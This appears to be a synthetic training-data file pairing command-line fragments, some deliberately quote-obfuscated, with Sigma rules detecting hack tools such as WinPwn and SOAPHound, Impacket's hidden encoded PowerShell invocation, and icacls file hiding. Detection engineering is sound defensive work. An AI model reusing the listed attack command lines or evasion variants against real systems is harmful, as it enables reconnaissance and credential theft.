{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpLDAPmonitor.exe SharpLDAPmonitor.exe /user: /pass: /dcip:", "output": "title: HackTool - SharpLDAPmonitor Execution\nid: 9f8fc146-1d1a-4dbf-b8fd-dfae15e08541\nstatus: test\ndescription: Detects execution of the SharpLDAPmonitor. Which can monitor the creation, deletion and changes to LDAP objects.\nreferences:\n    - https://github.com/p0dalirius/LDAPmonitor\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-30\nmodified: 2023-02-14\ntags:\n    - attack.discovery\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpLDAPmonitor.exe'\n        - OriginalFileName: 'SharpLDAPmonitor.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/pass:'\n            - '/dcip:'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpLDAPmonitor.exe \"SharpLDAPmonitor.exe\" \"/user:\" /pass: /dcip:", "output": "title: HackTool - SharpLDAPmonitor Execution\nid: 9f8fc146-1d1a-4dbf-b8fd-dfae15e08541\nstatus: test\ndescription: Detects execution of the SharpLDAPmonitor. Which can monitor the creation, deletion and changes to LDAP objects.\nreferences:\n    - https://github.com/p0dalirius/LDAPmonitor\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-30\nmodified: 2023-02-14\ntags:\n    - attack.discovery\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpLDAPmonitor.exe'\n        - OriginalFileName: 'SharpLDAPmonitor.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/pass:'\n            - '/dcip:'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpLDAPmonitor SharpLDAPmonitor /user: /pass: /dcip:", "output": "title: HackTool - SharpLDAPmonitor Execution\nid: 9f8fc146-1d1a-4dbf-b8fd-dfae15e08541\nstatus: test\ndescription: Detects execution of the SharpLDAPmonitor. Which can monitor the creation, deletion and changes to LDAP objects.\nreferences:\n    - https://github.com/p0dalirius/LDAPmonitor\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-30\nmodified: 2023-02-14\ntags:\n    - attack.discovery\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpLDAPmonitor.exe'\n        - OriginalFileName: 'SharpLDAPmonitor.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/pass:'\n            - '/dcip:'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\SharpLDAPmonitor.exe SharpLDAPmonitor.exe /user: /pass: /dcip:", "output": "title: HackTool - SharpLDAPmonitor Execution\nid: 9f8fc146-1d1a-4dbf-b8fd-dfae15e08541\nstatus: test\ndescription: Detects execution of the SharpLDAPmonitor. Which can monitor the creation, deletion and changes to LDAP objects.\nreferences:\n    - https://github.com/p0dalirius/LDAPmonitor\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-30\nmodified: 2023-02-14\ntags:\n    - attack.discovery\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpLDAPmonitor.exe'\n        - OriginalFileName: 'SharpLDAPmonitor.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/pass:'\n            - '/dcip:'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--buildcache --bhdump --certdump --dnsdump -c --cachefilename -o --outputdirectory", "output": "title: HackTool - SOAPHound Execution\nid: e92a4287-e072-4a40-9739-370c106bb750\nstatus: test\ndescription: |\n    Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\nreferences:\n    - https://github.com/FalconForceTeam/SOAPHound\n    - https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c\nauthor: '@kostastsale'\ndate: 2024-01-26\ntags:\n    - attack.discovery\n    - attack.t1087\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - ' --buildcache '\n            - ' --bhdump '\n            - ' --certdump '\n            - ' --dnsdump '\n    selection_2:\n        CommandLine|contains:\n            - ' -c '\n            - ' --cachefilename '\n            - ' -o '\n            - ' --outputdirectory'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--buildcache --bhdump --certdump --dnsdump \"-c\" \"--cachefilename\" -o --outputdirectory", "output": "title: HackTool - SOAPHound Execution\nid: e92a4287-e072-4a40-9739-370c106bb750\nstatus: test\ndescription: |\n    Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\nreferences:\n    - https://github.com/FalconForceTeam/SOAPHound\n    - https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c\nauthor: '@kostastsale'\ndate: 2024-01-26\ntags:\n    - attack.discovery\n    - attack.t1087\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - ' --buildcache '\n            - ' --bhdump '\n            - ' --certdump '\n            - ' --dnsdump '\n    selection_2:\n        CommandLine|contains:\n            - ' -c '\n            - ' --cachefilename '\n            - ' -o '\n            - ' --outputdirectory'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--buildcache --bhdump --certdump --dnsdump -c --cachefilename -o --outputdirectory", "output": "title: HackTool - SOAPHound Execution\nid: e92a4287-e072-4a40-9739-370c106bb750\nstatus: test\ndescription: |\n    Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\nreferences:\n    - https://github.com/FalconForceTeam/SOAPHound\n    - https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c\nauthor: '@kostastsale'\ndate: 2024-01-26\ntags:\n    - attack.discovery\n    - attack.t1087\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - ' --buildcache '\n            - ' --bhdump '\n            - ' --certdump '\n            - ' --dnsdump '\n    selection_2:\n        CommandLine|contains:\n            - ' -c '\n            - ' --cachefilename '\n            - ' -o '\n            - ' --outputdirectory'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "TruffleSnout.exe \\TruffleSnout.exe", "output": "title: HackTool - TruffleSnout Execution\nid: 69ca006d-b9a9-47f5-80ff-ecd4d25d481a\nstatus: test\ndescription: Detects the use of TruffleSnout.exe an iterative AD discovery toolkit for offensive operators, situational awareness and targeted low noise enumeration.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1482/T1482.md\n    - https://github.com/dsnezhkov/TruffleSnout\n    - https://github.com/dsnezhkov/TruffleSnout/blob/7c2f22e246ef704bc96c396f66fa854e9ca742b9/TruffleSnout/Docs/USAGE.md\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-13\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'TruffleSnout.exe'\n        - Image|endswith: '\\TruffleSnout.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "TruffleSnout.exe \\Truffle\"Snout.exe\"", "output": "title: HackTool - TruffleSnout Execution\nid: 69ca006d-b9a9-47f5-80ff-ecd4d25d481a\nstatus: test\ndescription: Detects the use of TruffleSnout.exe an iterative AD discovery toolkit for offensive operators, situational awareness and targeted low noise enumeration.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1482/T1482.md\n    - https://github.com/dsnezhkov/TruffleSnout\n    - https://github.com/dsnezhkov/TruffleSnout/blob/7c2f22e246ef704bc96c396f66fa854e9ca742b9/TruffleSnout/Docs/USAGE.md\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-13\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'TruffleSnout.exe'\n        - Image|endswith: '\\TruffleSnout.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "TruffleSnout \\TruffleSnout", "output": "title: HackTool - TruffleSnout Execution\nid: 69ca006d-b9a9-47f5-80ff-ecd4d25d481a\nstatus: test\ndescription: Detects the use of TruffleSnout.exe an iterative AD discovery toolkit for offensive operators, situational awareness and targeted low noise enumeration.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1482/T1482.md\n    - https://github.com/dsnezhkov/TruffleSnout\n    - https://github.com/dsnezhkov/TruffleSnout/blob/7c2f22e246ef704bc96c396f66fa854e9ca742b9/TruffleSnout/Docs/USAGE.md\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-13\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'TruffleSnout.exe'\n        - Image|endswith: '\\TruffleSnout.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "TruffleSnout.exe \\TruffleSnout.exe", "output": "title: HackTool - TruffleSnout Execution\nid: 69ca006d-b9a9-47f5-80ff-ecd4d25d481a\nstatus: test\ndescription: Detects the use of TruffleSnout.exe an iterative AD discovery toolkit for offensive operators, situational awareness and targeted low noise enumeration.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1482/T1482.md\n    - https://github.com/dsnezhkov/TruffleSnout\n    - https://github.com/dsnezhkov/TruffleSnout/blob/7c2f22e246ef704bc96c396f66fa854e9ca742b9/TruffleSnout/Docs/USAGE.md\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-13\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'TruffleSnout.exe'\n        - Image|endswith: '\\TruffleSnout.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Offline_Winpwn WinPwn WinPwn.exe WinPwn.ps1", "output": "title: HackTool - WinPwn Execution\nid: d557dc06-62e8-4468-a8e8-7984124908ce\nrelated:\n    - id: 851fd622-b675-4d26-b803-14bc7baa517a\n      type: similar\nstatus: test\ndescription: |\n    Detects commandline keywords indicative of potential usge of the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-12-04\nreferences:\n    - https://github.com/S3cur3Th1sSh1t/WinPwn\n    - https://www.publicnow.com/view/EB87DB49C654D9B63995FAD4C9DE3D3CC4F6C3ED?1671634841\n    - https://reconshell.com/winpwn-tool-for-internal-windows-pentesting-and-ad-security/\n    - https://github.com/redcanaryco/atomic-red-team/blob/4d6c4e8e23d465af7a2388620cfe3f8c76e16cf0/atomics/T1082/T1082.md\n    - https://grep.app/search?q=winpwn&filter[repo][0]=redcanaryco/atomic-red-team\ntags:\n    - attack.credential-access\n    - attack.defense-evasion\n    - attack.discovery\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1046\n    - attack.t1082\n    - attack.t1106\n    - attack.t1518\n    - attack.t1548.002\n    - attack.t1552.001\n    - attack.t1555\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Offline_Winpwn'\n            - 'WinPwn '\n            - 'WinPwn.exe'\n            - 'WinPwn.ps1'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Offline_Winpwn WinPwn \"W\"\"i\"\"n\"\"P\"\"w\"\"n\"\".\"\"e\"\"x\"\"e\" WinPwn.ps1", "output": "title: HackTool - WinPwn Execution\nid: d557dc06-62e8-4468-a8e8-7984124908ce\nrelated:\n    - id: 851fd622-b675-4d26-b803-14bc7baa517a\n      type: similar\nstatus: test\ndescription: |\n    Detects commandline keywords indicative of potential usge of the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-12-04\nreferences:\n    - https://github.com/S3cur3Th1sSh1t/WinPwn\n    - https://www.publicnow.com/view/EB87DB49C654D9B63995FAD4C9DE3D3CC4F6C3ED?1671634841\n    - https://reconshell.com/winpwn-tool-for-internal-windows-pentesting-and-ad-security/\n    - https://github.com/redcanaryco/atomic-red-team/blob/4d6c4e8e23d465af7a2388620cfe3f8c76e16cf0/atomics/T1082/T1082.md\n    - https://grep.app/search?q=winpwn&filter[repo][0]=redcanaryco/atomic-red-team\ntags:\n    - attack.credential-access\n    - attack.defense-evasion\n    - attack.discovery\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1046\n    - attack.t1082\n    - attack.t1106\n    - attack.t1518\n    - attack.t1548.002\n    - attack.t1552.001\n    - attack.t1555\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Offline_Winpwn'\n            - 'WinPwn '\n            - 'WinPwn.exe'\n            - 'WinPwn.ps1'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Offline_Winpwn WinPwn WinPwn WinPwn", "output": "title: HackTool - WinPwn Execution\nid: d557dc06-62e8-4468-a8e8-7984124908ce\nrelated:\n    - id: 851fd622-b675-4d26-b803-14bc7baa517a\n      type: similar\nstatus: test\ndescription: |\n    Detects commandline keywords indicative of potential usge of the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-12-04\nreferences:\n    - https://github.com/S3cur3Th1sSh1t/WinPwn\n    - https://www.publicnow.com/view/EB87DB49C654D9B63995FAD4C9DE3D3CC4F6C3ED?1671634841\n    - https://reconshell.com/winpwn-tool-for-internal-windows-pentesting-and-ad-security/\n    - https://github.com/redcanaryco/atomic-red-team/blob/4d6c4e8e23d465af7a2388620cfe3f8c76e16cf0/atomics/T1082/T1082.md\n    - https://grep.app/search?q=winpwn&filter[repo][0]=redcanaryco/atomic-red-team\ntags:\n    - attack.credential-access\n    - attack.defense-evasion\n    - attack.discovery\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1046\n    - attack.t1082\n    - attack.t1106\n    - attack.t1518\n    - attack.t1548.002\n    - attack.t1552.001\n    - attack.t1555\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Offline_Winpwn'\n            - 'WinPwn '\n            - 'WinPwn.exe'\n            - 'WinPwn.ps1'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Offline_Winpwn WinPwn WinPwn.exe WinPwn.ps1", "output": "title: HackTool - WinPwn Execution\nid: d557dc06-62e8-4468-a8e8-7984124908ce\nrelated:\n    - id: 851fd622-b675-4d26-b803-14bc7baa517a\n      type: similar\nstatus: test\ndescription: |\n    Detects commandline keywords indicative of potential usge of the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.\nauthor: Swachchhanda Shrawan Poudel\ndate: 2023-12-04\nreferences:\n    - https://github.com/S3cur3Th1sSh1t/WinPwn\n    - https://www.publicnow.com/view/EB87DB49C654D9B63995FAD4C9DE3D3CC4F6C3ED?1671634841\n    - https://reconshell.com/winpwn-tool-for-internal-windows-pentesting-and-ad-security/\n    - https://github.com/redcanaryco/atomic-red-team/blob/4d6c4e8e23d465af7a2388620cfe3f8c76e16cf0/atomics/T1082/T1082.md\n    - https://grep.app/search?q=winpwn&filter[repo][0]=redcanaryco/atomic-red-team\ntags:\n    - attack.credential-access\n    - attack.defense-evasion\n    - attack.discovery\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1046\n    - attack.t1082\n    - attack.t1106\n    - attack.t1518\n    - attack.t1548.002\n    - attack.t1552.001\n    - attack.t1555\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Offline_Winpwn'\n            - 'WinPwn '\n            - 'WinPwn.exe'\n            - 'WinPwn.ps1'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc", "output": "title: HackTool - Wmiexec Default Powershell Command\nid: 022eaba8-f0bf-4dd9-9217-4604b0bb3bb0\nstatus: test\ndescription: Detects the execution of PowerShell with a specific flag sequence that is used by the Wmiexec script\nreferences:\n    - https://github.com/fortra/impacket/blob/f4b848fa27654ca95bc0f4c73dbba8b9c2c9f30a/examples/wmiexec.py\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-08\ntags:\n    - attack.defense-evasion\n    - attack.lateral-movement\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '-NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-NoP -NoL -sta -NonI -W Hidden -Exec \"Byp\"ass -Enc", "output": "title: HackTool - Wmiexec Default Powershell Command\nid: 022eaba8-f0bf-4dd9-9217-4604b0bb3bb0\nstatus: test\ndescription: Detects the execution of PowerShell with a specific flag sequence that is used by the Wmiexec script\nreferences:\n    - https://github.com/fortra/impacket/blob/f4b848fa27654ca95bc0f4c73dbba8b9c2c9f30a/examples/wmiexec.py\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-08\ntags:\n    - attack.defense-evasion\n    - attack.lateral-movement\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '-NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc", "output": "title: HackTool - Wmiexec Default Powershell Command\nid: 022eaba8-f0bf-4dd9-9217-4604b0bb3bb0\nstatus: test\ndescription: Detects the execution of PowerShell with a specific flag sequence that is used by the Wmiexec script\nreferences:\n    - https://github.com/fortra/impacket/blob/f4b848fa27654ca95bc0f4c73dbba8b9c2c9f30a/examples/wmiexec.py\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-08\ntags:\n    - attack.defense-evasion\n    - attack.lateral-movement\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '-NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\HOSTNAME.EXE", "output": "title: Suspicious Execution of Hostname\nid: 7be5fb68-f9ef-476d-8b51-0256ebece19e\nstatus: test\ndescription: Use of hostname to get information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-6---hostname-discovery-windows\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname\nauthor: frack113\ndate: 2022-01-01\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\HOSTNAME.EXE'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"H\"\"O\"\"S\"\"T\"\"N\"\"A\"\"M\"\"E\"\".\"\"E\"\"X\"\"E\"", "output": "title: Suspicious Execution of Hostname\nid: 7be5fb68-f9ef-476d-8b51-0256ebece19e\nstatus: test\ndescription: Use of hostname to get information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-6---hostname-discovery-windows\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname\nauthor: frack113\ndate: 2022-01-01\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\HOSTNAME.EXE'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\HOSTNAME", "output": "title: Suspicious Execution of Hostname\nid: 7be5fb68-f9ef-476d-8b51-0256ebece19e\nstatus: test\ndescription: Use of hostname to get information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-6---hostname-discovery-windows\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname\nauthor: frack113\ndate: 2022-01-01\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\HOSTNAME.EXE'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\HOSTNAME.EXE", "output": "title: Suspicious Execution of Hostname\nid: 7be5fb68-f9ef-476d-8b51-0256ebece19e\nstatus: test\ndescription: Use of hostname to get information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md#atomic-test-6---hostname-discovery-windows\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname\nauthor: frack113\ndate: 2022-01-01\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\HOSTNAME.EXE'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Hwp.exe \\gbb.exe", "output": "title: Suspicious HWP Sub Processes\nid: 023394c4-29d5-46ab-92b8-6a534c6f447b\nstatus: test\ndescription: Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\nreferences:\n    - https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/\n    - https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1\n    - https://twitter.com/cyberwar_15/status/1187287262054076416\n    - https://blog.alyac.co.kr/1901\n    - https://en.wikipedia.org/wiki/Hangul_(word_processor)\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.initial-access\n    - attack.t1566.001\n    - attack.execution\n    - attack.t1203\n    - attack.t1059.003\n    - attack.g0032\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Hwp.exe'\n        Image|endswith: '\\gbb.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\Hwp.exe\" \\gbb.exe", "output": "title: Suspicious HWP Sub Processes\nid: 023394c4-29d5-46ab-92b8-6a534c6f447b\nstatus: test\ndescription: Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\nreferences:\n    - https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/\n    - https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1\n    - https://twitter.com/cyberwar_15/status/1187287262054076416\n    - https://blog.alyac.co.kr/1901\n    - https://en.wikipedia.org/wiki/Hangul_(word_processor)\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.initial-access\n    - attack.t1566.001\n    - attack.execution\n    - attack.t1203\n    - attack.t1059.003\n    - attack.g0032\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Hwp.exe'\n        Image|endswith: '\\gbb.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Hwp \\gbb", "output": "title: Suspicious HWP Sub Processes\nid: 023394c4-29d5-46ab-92b8-6a534c6f447b\nstatus: test\ndescription: Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\nreferences:\n    - https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/\n    - https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1\n    - https://twitter.com/cyberwar_15/status/1187287262054076416\n    - https://blog.alyac.co.kr/1901\n    - https://en.wikipedia.org/wiki/Hangul_(word_processor)\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.initial-access\n    - attack.t1566.001\n    - attack.execution\n    - attack.t1203\n    - attack.t1059.003\n    - attack.g0032\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Hwp.exe'\n        Image|endswith: '\\gbb.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Hwp.exe \\gbb.exe", "output": "title: Suspicious HWP Sub Processes\nid: 023394c4-29d5-46ab-92b8-6a534c6f447b\nstatus: test\ndescription: Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\nreferences:\n    - https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/\n    - https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1\n    - https://twitter.com/cyberwar_15/status/1187287262054076416\n    - https://blog.alyac.co.kr/1901\n    - https://en.wikipedia.org/wiki/Hangul_(word_processor)\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.initial-access\n    - attack.t1566.001\n    - attack.execution\n    - attack.t1203\n    - attack.t1059.003\n    - attack.g0032\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\Hwp.exe'\n        Image|endswith: '\\gbb.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "iCACLS.EXE \\icacls.exe /deny S-1-1-0:", "output": "title: Use Icacls to Hide File to Everyone\nid: 4ae81040-fc1c-4249-bfa3-938d260214d9\nstatus: test\ndescription: Detect use of icacls to deny access for everyone in Users folder sometimes used to hide malicious files\nreferences:\n    - https://app.any.run/tasks/1df999e6-1cb8-45e3-8b61-499d1b7d5a9b/\nauthor: frack113\ndate: 2022-07-18\nmodified: 2024-04-29\ntags:\n    - attack.defense-evasion\n    - attack.t1564.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_icacls:\n        - OriginalFileName: 'iCACLS.EXE'\n        - Image|endswith: '\\icacls.exe'\n    selection_cmd: # icacls \"C:\\Users\\admin\\AppData\\Local\\37f92fe8-bcf0-4ee0-b8ba-561f797f5696\" /deny *S-1-1-0:(OI)(CI)(DE,DC)\n        CommandLine|contains|all:\n            - '/deny'\n            - '*S-1-1-0:'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "iCACLS \\icacls /deny S-1-1-0:", "output": "title: Use Icacls to Hide File to Everyone\nid: 4ae81040-fc1c-4249-bfa3-938d260214d9\nstatus: test\ndescription: Detect use of icacls to deny access for everyone in Users folder sometimes used to hide malicious files\nreferences:\n    - https://app.any.run/tasks/1df999e6-1cb8-45e3-8b61-499d1b7d5a9b/\nauthor: frack113\ndate: 2022-07-18\nmodified: 2024-04-29\ntags:\n    - attack.defense-evasion\n    - attack.t1564.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_icacls:\n        - OriginalFileName: 'iCACLS.EXE'\n        - Image|endswith: '\\icacls.exe'\n    selection_cmd: # icacls \"C:\\Users\\admin\\AppData\\Local\\37f92fe8-bcf0-4ee0-b8ba-561f797f5696\" /deny *S-1-1-0:(OI)(CI)(DE,DC)\n        CommandLine|contains|all:\n            - '/deny'\n            - '*S-1-1-0:'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
